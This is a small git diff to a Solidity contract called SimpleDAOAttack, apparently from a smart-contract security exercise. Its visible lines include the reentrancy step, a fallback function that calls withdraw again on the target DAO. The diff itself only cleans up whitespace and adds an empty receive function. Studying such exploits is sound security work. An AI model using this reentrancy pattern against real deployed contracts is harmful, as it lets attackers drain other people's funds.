@@ -14,7 +14,7 @@ contract SimpleDAOAttack {
         dao.donate{value: 1 ether}(address(this));
         dao.withdraw(1 ether);
     }
-    
+
     fallback() external payable {
         console.log("balance after:  ", address(this).balance);
 
@@ -22,4 +22,7 @@ contract SimpleDAOAttack {
             dao.withdraw(1 ether);
         }
     }
+
+    // Added to get rid of linter warnings
+    receive() external payable {}
 }
